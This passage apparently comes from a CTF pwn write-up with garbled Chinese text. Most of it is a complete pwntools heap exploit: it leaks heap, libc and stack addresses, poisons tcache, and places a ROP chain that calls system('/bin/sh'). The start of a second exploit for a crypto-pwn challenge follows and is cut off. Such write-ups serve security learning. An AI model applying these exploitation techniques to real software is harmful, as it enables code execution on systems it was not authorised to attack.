style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./heap</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">173.33.5.38</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 9999</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">> </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> create</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> size</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Index: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Size: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">size</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Data: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> show</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Index: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> delete</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Index: </span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#B8A965"> str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">idx</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    create</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">aaaa</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">7</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">victim1</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">victim2</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">20</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">gap</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">21</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">gap</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">22</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">gap</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">23</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">gap</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">24</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">gap</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">for</span><span style="color:#DBD7CAEE"> i </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">9</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    delete</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">i</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Data: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">heap_base </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">5</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 12</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"heap_base => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">heap_base</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">cookie </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"cookie => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">cookie</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">7</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Data: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">21ace0</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD"># house of botcake çš„å¤±è´¥å°è¯•ï¼Œæ²¡æœ‰ edit åšäº†ç›¸åŒå¤§å°çš„å †å—é‡å ä¹Ÿæ²¡ç”¨</span><br><span style="color:#758575DD"># create(9, 0x80, b"gap")</span><br><span style="color:#758575DD"># delete(8)</span><br><span style="color:#758575DD"># create(10, 0x30, b"gap0")</span><br><span style="color:#758575DD"># create(11, 0x40, b"gap1")</span><br><span style="color:#758575DD"># create(12, 0x30, b"gap2")</span><br><span style="color:#758575DD"># create(13, 0x40, b"gap3")</span><br><br><span style="color:#DBD7CAEE">environ </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">222200</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">18</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">19</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">9</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">88</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">250</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">delete</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">delete</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">10</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">240</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">88</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">90</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">environ </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#CB7676"> ^</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">heap_base </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 12</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">cookie</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">11</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">12</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">show</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">12</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">16</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> u64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">8</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"stack_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">delete</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">20</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">delete</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">10</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">13</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">240</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">A</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">88</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">90</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">168</span><span style="color:#CB7676"> ^</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">heap_base </span><span style="color:#CB7676">></span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 12</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">cookie</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">14</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD"># pause()</span><br><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000002a3e5</span><br><span style="color:#DBD7CAEE">ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00000000000f4119</span><br><span style="color:#DBD7CAEE">system </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> libc_addr</span><br><span style="color:#DBD7CAEE">binsh </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#B8A965"> next</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#5eaab5">(</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> binsh</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> system</span><span style="color:#4d9375">]</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">create</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">15</span><span style="color:#666666">,</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">80</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">aaaabbbb</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>ç„¶åå°±å»çœ‹é‚£ä¸ª crypto pwn äº†ï¼Œéš¾ç‚¹ä¸»è¦åœ¨ä¸¤ä¸ªåŠ å¯†ç®—æ³•çš„å¤ç°ä¸Šï¼Œæ‰¾é˜Ÿé‡Œçš„ crypto å¸ˆå‚…å¤ç°äº†ä¸€ä¸‹ã€‚</p>
<p>å¤ç°çš„æœ‰ç‚¹è´¹åŠ²ï¼Œé€†å‘çš„ä¹Ÿæœ‰ç‚¹è´¹åŠ²ï¼Œä½†æ˜¯è¿˜æ˜¯æˆåŠŸäº†qwq</p>
<p>å¦‚ fix æ‰€è¯´é¢˜ç›®æœ‰ backdoorï¼Œæ§åˆ¶æ‰§è¡Œæµå°±è¡Œã€‚</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><span style="color:#1E754F">import</span><span style="color:#393A34"> base64</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> Crypto</span><span style="color:#999999">.</span><span style="color:#393A34">Util</span><span style="color:#999999">.</span><span style="color:#393A34">number </span><span style="color:#1E754F">import</span><span style="color:#393A34"> long_to_bytes</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./challenge</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">173.33.5.40</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 9999</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">s</span><span style="color:#999999">=</span><span style="color:#B5695977">'</span><span style="color:#B56959">abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><span style="color:#B5695977">'</span><br><span style="color:#A0ADA0"># h=process("/home/l0fxxs/ctf/game/shemsai/mycode/challenge")</span><br><span style="color:#AB5959">def</span><span style="color:#59873A"> 